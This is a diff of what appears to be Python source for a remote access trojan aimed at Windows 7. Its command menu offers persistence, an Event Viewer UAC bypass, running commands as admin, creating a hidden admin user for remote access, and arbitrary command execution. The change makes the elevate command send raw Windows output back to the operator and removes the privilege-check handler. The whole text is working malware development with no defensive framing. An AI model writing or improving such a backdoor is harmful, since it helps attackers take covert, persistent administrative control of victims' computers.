@@ -129,10 +129,10 @@ PERSISTENCE:
   persist       - Install persistence
 
 PRIVILEGE ESCALATION (Windows 7):
-  check_privs   - Check current privilege level
-  escalate      - Perform Event Viewer UAC bypass
-  elevate <cmd> - Execute command with admin privileges
-  create_admin  - Create admin user for remote access
+  check_privs         - Check current privilege level
+  escalate            - Perform Event Viewer UAC bypass
+  elevate <command>   - Execute command with admin privileges (shows actual output)
+  create_admin        - Create admin user for remote access
 
 SYSTEM:
   <command>     - Execute any system command
@@ -340,7 +340,8 @@ SYSTEM:
                 success, result = privilege_escalator.execute_admin_command(admin_command)
                 
                 if success:
-                    reliable_send("SUCCESS: " + result)
+                    # Send actual Windows command output
+                    reliable_send(result)
                 else:
                     reliable_send("FAILED: " + result)
                     
@@ -362,17 +363,6 @@ SYSTEM:
                     
             except Exception as e:
                 reliable_send("Admin user creation error: " + str(e))
-                
-        elif command == 'check_privs':
-            try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                
-                current_user = privilege_escalator.get_current_user()
-                reliable_send("Current privileges: " + current_user)
-                
-            except Exception as e:
-                reliable_send("Privilege check error: " + str(e))
 
         # FILE OPERATIONS
         elif command[:8] == 'download':
